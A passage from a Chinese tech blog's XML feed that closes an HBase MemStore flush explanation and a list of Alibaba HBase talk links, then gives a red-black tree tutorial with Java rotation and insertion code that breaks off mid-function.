阶段：刷写的第一步是对 MemStore 做 snapshot，为了防止刷写过程中更新的数据同时在 snapshot 和 MemStore 中而造成后续处理的困难，所以在刷写期间需要持有 updateLock 。持有了 updateLock 之后，这将阻塞客户端的写操作。所以只在创建 snapshot 期间持有 updateLock，而且 snapshot 的创建非常快，所以此锁期间对客户的影响一般非常小。对 MemStore 做 snapshot 是 internalPrepareFlushCache 里面进行的。</p></li><li><p><strong>flushCache</strong> 阶段：如果创建快照没问题，那么返回的 result.result 将为 null。这时候我们就可以进行下一步 internalFlushCacheAndCommit。其实 internalFlushCacheAndCommit 里面包含两个步骤：flushCache 和 commit 阶段。flushCache 阶段其实就是将 prepareFlush 阶段创建好的快照写到临时文件里面，临时文件是存放在对应 Region 文件夹下面的 .tmp 目录里面。</p></li><li><p><strong>commit</strong> 阶段：将 flushCache 阶段生产的临时文件移到(rename)对应的列族目录下面，并做一些清理工作，比如删除第一步生成的 snapshot。</p></li></ul><h2 id="1-HBase多模式"><a href="#1-HBase多模式" class="headerlink" title="1.HBase多模式"></a><strong>1.HBase多模式</strong></h2><p>分享专家：明惠(网名：过往记忆)-阿里云数据架构师</p><p>分享主题：HBase多模式</p><p>视频地址：<a href="https://yunqivedio.alicdn.com/od/s5xhh1542269262038.mp4" target="_blank" rel="noopener">https://yunqivedio.alicdn.com/od/s5xhh1542269262038.mp4</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3033" target="_blank" rel="noopener">https://yq.aliyun.com/download/3033</a></p><h2 id="2-HBase内核及能力"><a href="#2-HBase内核及能力" class="headerlink" title="2.HBase内核及能力"></a><strong>2.HBase内核及能力</strong></h2><p>分享专家：正研-阿里巴巴技术专家</p><p>分享主题：HBase内核及能力</p><p>视频地址：<a href="https://yunqivedio.alicdn.com/od/i43cD1542260050827.mp4" target="_blank" rel="noopener">https://yunqivedio.alicdn.com/od/i43cD1542260050827.mp4</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3091" target="_blank" rel="noopener">https://yq.aliyun.com/download/3091</a></p><p><strong>3.Spark介绍及Spark多数据源分析</strong></p><p>分享专家：沐远-阿里多模型数据库专家</p><p>分享主题：Spark介绍及Spark多数据源分析</p><p>视频地址：<a href="https://yunqivedio.alicdn.com/od/Fni7p1542851946894.mp4" target="_blank" rel="noopener">https://yunqivedio.alicdn.com/od/Fni7p1542851946894.mp4</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3104" target="_blank" rel="noopener">https://yq.aliyun.com/download/3104</a></p><p><strong>4.Phoenix=HBase+SQL 让HBase插上了翅膀</strong></p><p>分享专家：张赟-阿里多模型数据库专家</p><p>分享主题：Phoenix 基本介绍及二级索引</p><p>视频地址：<a href="https://yunqivedio.alicdn.com/od/Fni7p1542851946894.mp4" target="_blank" rel="noopener">https://yunqivedio.alicdn.com/od/Fni7p1542851946894.mp4</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3111" target="_blank" rel="noopener">https://yq.aliyun.com/download/3111</a></p><p><strong>5.HBase备份恢复</strong></p><p>分享专家：玄陵-阿里多模型数据库专家</p><p>分享主题：HBase备份恢复</p><p>视频地址：<a href="https://yq.aliyun.com/live/688" target="_blank" rel="noopener">https://yq.aliyun.com/live/688</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3126" target="_blank" rel="noopener">https://yq.aliyun.com/download/3126</a><br><strong>6.HBaseOnOSS冷数据存储</strong></p><p>分享专家：陆豪-阿里多模型数据库专家</p><p>分享主题：HBaseOnOSS冷数据存储</p><p>视频地址：<a href="https://yq.aliyun.com/live/709" target="_blank" rel="noopener">https://yq.aliyun.com/live/709</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3137" target="_blank" rel="noopener">https://yq.aliyun.com/download/3137</a></p><p><strong>7.HBase高效一键迁移的设计与实践</strong></p><p>分享专家：侧田-阿里高级开发工程师</p><p>分享主题：HBase高效一键迁移的设计与实践</p><p>视频地址：<a href="https://yq.aliyun.com/live/730" target="_blank" rel="noopener">https://yq.aliyun.com/live/730</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3145" target="_blank" rel="noopener">https://yq.aliyun.com/download/3145</a></p><p><strong>8.GeoMesa时空基础及应用场景</strong></p><p>分享专家：肖斐-阿里云数据库技术专家</p><p>分享主题：GeoMesa时空基础及应用场景</p><p>视频地址：<a href="https://yq.aliyun.com/live/793" target="_blank" rel="noopener">https://yq.aliyun.com/live/793</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3266" target="_blank" rel="noopener">https://yq.aliyun.com/download/3266</a></p><p><strong>9.Graph图数据库基础介绍及场景</strong></p><p>分享专家：陈江(恬泰)-阿里数据库技术专家</p><p>分享主题：Graph图数据库基础介绍及场景</p><p>视频地址：<a href="https://yq.aliyun.com/live/805" target="_blank" rel="noopener">https://yq.aliyun.com/live/805</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3270" target="_blank" rel="noopener">https://yq.aliyun.com/download/3270</a></p><p><strong>10.Solr增强HBase检索能力基础介绍及场景</strong></p><p>分享专家：天斯-阿里高级开发工程师</p><p>分享主题：Solr增强HBase检索能力基础介绍及场景</p><p>视频地址：<a href="https://yq.aliyun.com/live/814" target="_blank" rel="noopener">https://yq.aliyun.com/live/814</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3273" target="_blank" rel="noopener">https://yq.aliyun.com/download/3273</a></p><p><strong>11.**</strong>Phoenix全局索引原理与实践**</p><p>分享专家：瑾谦-阿里数据库产品专家</p><p>分享主题：Phoenix全局索引原理与实践</p><p>视频地址：<a href="https://yq.aliyun.com/live/843" target="_blank" rel="noopener">https://yq.aliyun.com/live/843</a></p><p>PPT 地址：<a href="https://yq.aliyun.com/download/3300" target="_blank" rel="noopener">https://yq.aliyun.com/download/3300</a></p><p>转载自：<a href="https://mp.weixin.qq.com/s/lEfTrbd7bB4Xi0s86drr3g" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> Hbase </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hbase </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红黑树的理解与Java实现</title>
      <link href="/2019/01/25/java/java-rong-qi/hong-hei-shu-de-li-jie-yu-java-shi-xian/"/>
      <url>/2019/01/25/java/java-rong-qi/hong-hei-shu-de-li-jie-yu-java-shi-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="红黑树的理解与Java实现"><a href="#红黑树的理解与Java实现" class="headerlink" title="红黑树的理解与Java实现"></a>红黑树的理解与Java实现</h1><p><em>摘要：</em> 红黑树原理 红黑树（Red-Black Tree，简称R-B Tree），它是一种特殊的二叉查找树。首先它满足二叉查找树的特征：任意结点结点包含的键值，大于左孩子的键值，小于右孩子的键值。</p><h2 id="红黑树原理"><a href="#红黑树原理" class="headerlink" title="红黑树原理"></a>红黑树原理</h2><p>红黑树（Red-Black Tree，简称R-B Tree），它是一种特殊的二叉查找树。首先它满足二叉查找树的特征：任意结点结点包含的键值，大于左孩子的键值，小于右孩子的键值。<br>除此之外，红黑树的每个结点都有存储位来表示结点的颜色，不是红（Red）就是 黑（Black）。<br>红黑树的特性：</p><blockquote><ul><li>1.每个结点或是红色的，或是黑色的。</li><li>2.根结点是黑色的。</li><li>3.每个叶结点（NIL）是黑色的。（最后的叶结点就是空的，或者用一个哨兵替换掉所有的空结点）</li><li>4.如果一个结点是红色的，那么它的两个子结点都是黑色的。</li><li>5.对每个结点，从该结点到其所有后代叶结点的简单路径上，均包含相同数目的黑色结点。</li></ul></blockquote><p>关于它的特性，需要注意：<br>第一，特性 3 中的叶子结点，是为空（NIL或null）的结点<br>第二，特性 5 ，确保没有一条路径会比其他路径长出2倍，因而是近似平衡的。</p><p>红黑树的图如下（直接借用算法导论中的图，其中<strong>浅色的为红色，深色的为黑色</strong>）：</p><p><img src="https://yqfile.alicdn.com/img_914a0fbb1748fa36335cbf1e6bf9e28b.png" alt="img_914a0fbb1748fa36335cbf1e6bf9e28b.png"></p><h2 id="红黑树的java代码实现"><a href="#红黑树的java代码实现" class="headerlink" title="红黑树的java代码实现"></a>红黑树的java代码实现</h2><p>红黑树的基本操作是查找，选择，添加，删除。查找就省略了，和二叉树的查找区别不大。在添加和删除后，都会用到红黑树的旋转。因为修改红黑树之后，会破坏红黑树的性质，所以需要旋转满足这几条性质。<br>旋转包括两种：<strong>左旋</strong>和<strong>右旋</strong></p><h3 id="1-基本定义"><a href="#1-基本定义" class="headerlink" title="1.基本定义"></a>1.基本定义</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RBTree</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span><span class="token punctuation">{</span>    <span class="token keyword">private</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> mRoot<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//根结点</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> RED <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> BLACK <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RBTNode</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span><span class="token punctuation">{</span>        <span class="token keyword">boolean</span> color<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//颜色</span>        T key<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关键字（键值）</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> left<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//左孩子</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> right<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//右孩子</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> parent<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//父节点</span>        <span class="token keyword">public</span> <span class="token function">RBTNode</span><span class="token punctuation">(</span>T key<span class="token punctuation">,</span> <span class="token keyword">boolean</span> color<span class="token punctuation">,</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> parent<span class="token punctuation">,</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> left<span class="token punctuation">,</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>key <span class="token operator">=</span> key<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>color <span class="token operator">=</span> color<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>left <span class="token operator">=</span> left<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>right <span class="token operator">=</span> right<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>说明：RBTree是红黑树对应的类，RBTNode是红黑树的结点类。在RBTree中包含了根节点mRoot和红黑树的相关API。</p><h3 id="2-左旋"><a href="#2-左旋" class="headerlink" title="2.左旋"></a>2.左旋</h3><p><img src="https://yqfile.alicdn.com/img_14fa2b534b7f4d58238f3cf9e9e8317e.png" alt="img_14fa2b534b7f4d58238f3cf9e9e8317e.png"></p><p>对x进行左旋，意味着将x变成一个左结点。</p><p>左旋代码</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*      * 对红黑树的节点(x)进行左旋转     *     * 左旋示意图(对节点x进行左旋)：     *      px                              px     *     /                               /     *    x                               y                     *   /  \      --(左旋)-.           / \                #     *  lx   y                          x  ry          *     /   \                       /  \     *    ly   ry                     lx  ly       *     *     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">leftRotate</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//设置x的右孩子为y</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> y <span class="token operator">=</span> x<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将 "y的左孩子" 设为 "x的右孩子"</span>        <span class="token comment" spellcheck="true">//如果y的左孩子非空，将 "x" 设为 "y的左孩子的父亲"</span>        x<span class="token punctuation">.</span>right <span class="token operator">=</span> y<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>y<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>            y<span class="token punctuation">.</span>left<span class="token punctuation">.</span>parent <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//将 "x的父亲" 设为 "y的父亲"</span>        y<span class="token punctuation">.</span>parent <span class="token operator">=</span> x<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>parent <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> y<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//如果 "x的父亲" 是空结点，则将y设为根结点</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">==</span> x<span class="token punctuation">)</span><span class="token punctuation">{</span>                x<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">=</span> y<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//如果 x是它父节点的左孩子，则将y设置为 "x的父节点的左孩子"</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                x<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">=</span> y<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//如果 x是它父节点的右孩子，则将y设置为 "x的父节点的右孩子"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 将 “x” 设为 “y的左孩子”</span>        y<span class="token punctuation">.</span>left <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将 “x的父节点” 设为 “y”</span>        x<span class="token punctuation">.</span>parent <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="3-右旋"><a href="#3-右旋" class="headerlink" title="3.右旋"></a>3.右旋</h3><p><img src="https://yqfile.alicdn.com/img_34d5409f96cce7b6029bdeb8f62d4e87.png" alt="img_34d5409f96cce7b6029bdeb8f62d4e87.png"></p><p>对y进行左旋，意味着”将y变成一个右节点”。</p><p>右旋代码：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*  * 对红黑树的节点(y)进行右旋转 * * 右旋示意图(对节点y进行左旋)： *            py                               py *           /                                / *          y                                x                   *         /  \      --(右旋)-.            /  \                     # *        x   ry                           lx   y   *       / \                                   / \                   # *      lx  rx                                rx  ry *  */</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">rightRotate</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 设置x是当前节点的左孩子。</span>    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x <span class="token operator">=</span> y<span class="token punctuation">.</span>left<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 将 “x的右孩子” 设为 “y的左孩子”；</span>    <span class="token comment" spellcheck="true">// 如果"x的右孩子"不为空的话，将 “y” 设为 “x的右孩子的父亲”</span>    y<span class="token punctuation">.</span>left <span class="token operator">=</span> x<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span>        x<span class="token punctuation">.</span>right<span class="token punctuation">.</span>parent <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 将 “y的父亲” 设为 “x的父亲”</span>    x<span class="token punctuation">.</span>parent <span class="token operator">=</span> y<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>y<span class="token punctuation">.</span>parent <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> x<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 如果 “y的父亲” 是空节点，则将x设为根节点</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>y <span class="token operator">==</span> y<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right<span class="token punctuation">)</span>            y<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 如果 y是它父节点的右孩子，则将x设为“y的父节点的右孩子”</span>        <span class="token keyword">else</span>            y<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// (y是它父节点的左孩子) 将x设为“x的父节点的左孩子”</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 将 “y” 设为 “x的右孩子”</span>    x<span class="token punctuation">.</span>right <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 将 “y的父节点” 设为 “x”</span>    y<span class="token punctuation">.</span>parent <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="4-添加"><a href="#4-添加" class="headerlink" title="4.添加"></a>4.添加</h3><p>将结点插入红黑树时，首先将红黑树当作一棵二叉查找树，然后将结点插入；然后将结点着色为红色，再通过“旋转和重新着色”等操作修正该树，使其成为一棵红黑树。详细步骤如下：<br><strong>第一步：将红黑树当作一棵二叉查找树，将结点插入</strong>（这个简单，不展开）。</p><p><strong>第二步：将插入的结点着色为“红色”</strong><br>为什么着色为红色，而不是黑色？可以观测红黑树的5个特性，发现不会违背“特性（5）”，当然有可能违背其他特性，但只是可能，不一定会，所以遵循着违背的越少越好的原则，将插入的结点着色为红色。</p><p><strong>第三步：通过一系列的选择或者着色等操作，使其重新成为红黑树</strong><br>第二步中，将插入节点着色为”红色”之后，不会违背”特性(5)”。那它到底会违背哪些特性呢？<br>对于”特性(1)”，显然不会违背了。因为我们已经将它涂成红色了。<br>对于”特性(2)”，显然也不会违背。在第一步中，我们是将红黑树当作二叉查找树，然后执行的插入操作。而根据二叉查找数的特点，插入操作不会改变根节点。所以，根节点仍然是黑色。<br>对于”特性(3)”，显然不会违背了。这里的叶子节点是指的空叶子节点，插入非空节点并不会对它们造成影响。<br>对于”特性(4)”，是有可能违背的！<br>那接下来，想办法使之”满足特性(4)”，就可以将树重新构造成红黑树了。</p><p>添加操作的实现代码</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*  * 将结点插入到红黑树中 * * 参数说明： *     node 插入的结点        // 对应《算法导论》中的node */</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> cmp<span class="token punctuation">;</span>    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> y <span class="token operator">=</span> null<span class="token punctuation">;</span>    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 1. 将红黑树当作一颗二叉查找树，将节点添加到二叉查找树中。</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        y <span class="token operator">=</span> x<span class="token punctuation">;</span>        cmp <span class="token operator">=</span> node<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            x <span class="token operator">=</span> x<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token keyword">else</span>            x <span class="token operator">=</span> x<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    node<span class="token punctuation">.</span>parent <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>y<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        cmp <span class="token operator">=</span> node<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>y<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            y<span class="token punctuation">.</span>left <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token keyword">else</span>            y<span class="token punctuation">.</span>right <span class="token operator">=</span> node<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> node<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 2. 设置节点的颜色为红色</span>    node<span class="token punctuation">.</span>color <span class="token operator">=</span> RED<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 3. 将它重新修正为一颗二叉查找树</span>    <span class="token function">insertFixUp</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*  * 新建结点(key)，并将其插入到红黑树中 * * 参数说明： *     key 插入结点的键值 */</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>T key<span class="token punctuation">)</span> <span class="token punctuation">{</span>    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">RBTNode</span><span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>BLACK<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 如果新建结点失败，则返回。</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> null<span class="token punctuation">)</span>        <span class="token function">insert</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>内部接口</strong> – insert(node)的作用是将”node”节点插入到红黑树中。<br><strong>外部接口</strong> – insert(key)的作用是将”key”添加到红黑树中。</p><p>添加修正操作的实现代码</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/* * 红黑树插入修正函数 * * 在向红黑树中插入节点之后(失去平衡)，再调用该函数； * 目的是将它重新塑造成一颗红黑树。 * * 参数说明： *     node 插入的结点        // 对应《算法导论》中的z */</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">insertFixUp</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> parent<span class="token punctuation">,</span> gparent<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 若“父节点存在，并且父节点的颜色是红色”</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>parent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isRed</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        gparent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//若“父节点”是“祖父节点的左孩子”</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">==</span> gparent<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Case 1条件：叔叔节点是红色</span>            RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> uncle <span class="token operator">=</span> gparent<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uncle<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isRed</span><span class="token punctuation">(</span>uncle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>uncle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setRed</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>                node <span class="token operator">=</span> gparent<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// Case 2条件：叔叔是黑色，且当前节点是右孩子</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token punctuation">.</span>right <span class="token operator">==</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>                RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tmp<span class="token punctuation">;</span>                <span class="token function">leftRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                tmp <span class="token operator">=</span> parent<span class="token punctuation">;</span>                parent <span class="token operator">=</span> node<span class="token punctuation">;</span>                node <span class="token operator">=</span> tmp<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// Case 3条件：叔叔是黑色，且当前节点是左孩子。</span>            <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setRed</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">rightRotate</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//若“z的父节点”是“z的祖父节点的右孩子”</span>            <span class="token comment" spellcheck="true">// Case 1条件：叔叔节点是红色</span>            RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> uncle <span class="token operator">=</span> gparent<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uncle<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isRed</span><span class="token punctuation">(</span>uncle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>uncle<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setRed</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>                node <span class="token operator">=</span> gparent<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// Case 2条件：叔叔是黑色，且当前节点是左孩子</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token punctuation">.</span>left <span class="token operator">==</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>                RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tmp<span class="token punctuation">;</span>                <span class="token function">rightRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                tmp <span class="token operator">=</span> parent<span class="token punctuation">;</span>                parent <span class="token operator">=</span> node<span class="token punctuation">;</span>                node <span class="token operator">=</span> tmp<span class="token 